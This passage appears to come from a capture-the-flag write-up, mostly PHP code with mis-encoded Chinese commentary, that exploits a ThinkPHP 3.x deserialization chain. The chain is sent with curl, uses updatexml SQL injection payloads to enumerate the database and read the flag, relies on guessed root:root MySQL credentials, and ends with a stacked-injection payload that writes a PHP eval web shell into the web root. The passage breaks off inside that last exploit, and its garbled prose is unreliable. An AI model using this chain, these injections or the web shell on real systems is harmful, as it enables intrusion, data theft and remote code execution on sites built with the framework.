&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png" alt="image-20211219200242251">&lt;/p>
&lt;p>çœ‹åˆ°äº†mysqlç”¨æˆ·ï¼Œå°è¯•å¼±å£ä»¤å¾—åˆ°root: root&lt;/p>
&lt;p>ä¹‹åå°±å¯ä»¥æŠŠæˆ‘ä»¬çš„ä¼ªæœåŠ¡ç«¯æ’¤äº†ï¼Œæ¢æˆçœŸæœåŠ¡ç«¯çš„ï¼Œè¿›è¡Œä¸€ä¸ªæ³¨å…¥&lt;/p>
&lt;ul>
&lt;li>ä½¿ç”¨ç›®æ ‡çš„æ•°æ®åº“é…ç½®å†æ¬¡è¿›è¡Œååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘&lt;code>DELETE&lt;/code>è¯­å¥çš„SQLæ³¨å…¥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬è¿˜å¯ä»¥æŠŠå †å æ‰“å¼€ï¼Œç”¨å †å æ³¨å…¥å†™shellï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜çš„expï¼ˆå‚è€ƒ&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">èµµæ€»çš„exp&lt;/a> èµµæ€»ç‰›é€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_MULTI_STATEMENTS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// æ‰“å¼€å †å æ³¨å…¥
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;3306&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// çŒœå‡ºå¼±å£ä»¤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75715e">// å †å æ³¨å…¥å†™å…¥shell
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=1;select &amp;#39;&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">_POST[amiz]);?&amp;gt;&amp;#39; into outfile &amp;#39;/var/www/html/amiz.php&amp;#39;;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
